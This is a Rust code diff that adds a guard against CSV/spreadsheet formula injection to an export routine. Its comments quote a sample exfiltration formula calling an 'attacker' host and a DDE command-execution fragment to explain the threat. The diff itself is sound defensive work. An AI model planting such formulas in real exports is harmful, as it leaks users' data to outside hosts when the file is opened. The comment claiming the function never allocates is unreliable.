@@ -408,13 +408,52 @@ fn error_csv_line(message: &str) -> Bytes {
 /// and objects (e.g. embedded relationships) are emitted as their JSON
 /// representation inside a single cell. The csv writer handles quoting and
 /// escaping based on the delimiter.
+///
+/// **CSV / formula-injection guard.** Any string-shaped output that starts
+/// with one of `=`, `+`, `-`, `@`, `\t`, `\r` is prefixed with a single
+/// quote so spreadsheet applications (Excel, `LibreOffice`, Numbers) render
+/// it as a literal cell value rather than parsing it as a formula or
+/// macro on open.  Without this guard, a cell containing
+/// `=HYPERLINK("http://attacker/?leak="&A1,"click")` exfiltrates row data
+/// to an attacker-controlled URL when the user opens the export. The
+/// prefix character is the standard OWASP mitigation; downstream tooling
+/// that wants the raw value sees the leading `'` and must strip it.
 fn value_to_csv_field(v: &serde_json::Value) -> String {
     match v {
         serde_json::Value::Null => String::new(),
         serde_json::Value::Bool(b) => b.to_string(),
-        serde_json::Value::Number(n) => n.to_string(),
-        serde_json::Value::String(s) => s.clone(),
-        other => serde_json::to_string(other).unwrap_or_default(),
+        // Numbers are emitted in their JSON canonical form. `serde_json::Number`
+        // cannot produce a leading dangerous character (only digits, `-`, `.`,
+        // and `e/E`); we still guard for `-` because `-2=1+cmd|...` is a
+        // documented attack and a negative number leading with `-` lets it
+        // sneak through the parser-level filter Excel applies to numeric cells.
+        serde_json::Value::Number(n) => guard_formula_injection(&n.to_string()),
+        serde_json::Value::String(s) => guard_formula_injection(s),
+        other => guard_formula_injection(&serde_json::to_string(other).unwrap_or_default()),
+    }
+}
+
+/// Single-byte sentinels that trigger formula evaluation in Excel /
+/// `LibreOffice` / Numbers when they appear as the first character of a
+/// cell.  Tab and CR are included because Excel will treat them as
+/// whitespace-prefixed formula starters when followed by `=` etc., and
+/// because both are present in OWASP's reference list for this attack.
+const FORMULA_INJECTION_SENTINELS: [char; 6] = ['=', '+', '-', '@', '\t', '\r'];
+
+/// Prefixes `value` with a single quote when its first character would
+/// otherwise be interpreted by a spreadsheet application as the start of
+/// a formula.  See the `value_to_csv_field` docstring for the threat
+/// model.  Returns `value` unchanged for non-dangerous prefixes (the
+/// common case) so the function is allocation-free on the hot path.
+pub(crate) fn guard_formula_injection(value: &str) -> String {
+    match value.chars().next() {
+        Some(c) if FORMULA_INJECTION_SENTINELS.contains(&c) => {
+            let mut out = String::with_capacity(value.len() + 1);
+            out.push('\'');
+            out.push_str(value);
+            out
+        },
+        _ => value.to_owned(),
     }
 }
 
